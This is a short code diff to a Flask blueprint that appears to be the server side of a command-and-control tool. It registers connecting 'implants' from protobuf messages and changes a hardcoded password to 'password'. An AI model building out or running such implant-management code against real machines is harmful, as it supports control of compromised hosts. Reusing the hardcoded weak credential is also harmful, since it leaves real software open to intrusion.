@@ -7,10 +7,11 @@ from cvnt.models import *
 
 rpc = Blueprint("rpc", __name__)
 
-password = "foobar"
+password = "password"
 
 @rpc.route("/register", methods=["POST"])
 def handle_register():
+    print(f'REGISTERING A NEW IMPLANT')
     register = RegisterImplant()
     req_data = request.get_data()
     register.ParseFromString(req_data)
@@ -21,13 +22,15 @@ def handle_register():
     db.commit()
     print("Watch out sexy ;) a New Implant connected!")
     return ""
-    
-    
+
+'''
 @rpc.route("/testpb", methods=["POST"])
 def handle_pbtest():
+    print(f'TEST PB ROUTE THING')
     register = RegisterImplant()
     req_data = request.get_data()
     register.ParseFromString(req_data)
     print(register)
     return ""
+'''
 
